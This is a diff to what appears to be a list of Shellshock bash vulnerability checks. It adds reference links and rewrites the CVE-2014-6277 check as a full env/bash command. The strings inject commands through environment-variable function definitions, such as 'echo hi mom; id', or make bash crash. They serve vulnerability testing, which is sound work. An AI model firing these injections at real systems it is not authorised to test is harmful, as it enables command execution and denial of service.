@@ -44,11 +44,13 @@ _will create a file named echo in cwd with date in it, if vulnerable_
 
 ### CVE-2014-6278
 + `() { _; } >_[$($())] { echo hi mom; id; }`
++ Additional information: http://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html
 
 ### CVE-2014-6277
 _will segfault if vulnerable_
-+ `() { x() { _; }; x() { _; } <<a; }`
++ `env X='() { x() { _; }; x() { _; } <<a; }' bash -c :`
 + Additional discussion on fulldisclosure: http://seclists.org/fulldisclosure/2014/Oct/9
++ Additional information: http://lcamtuf.blogspot.com/2014/10/bash-bug-how-we-finally-cracked.html
 
 
 
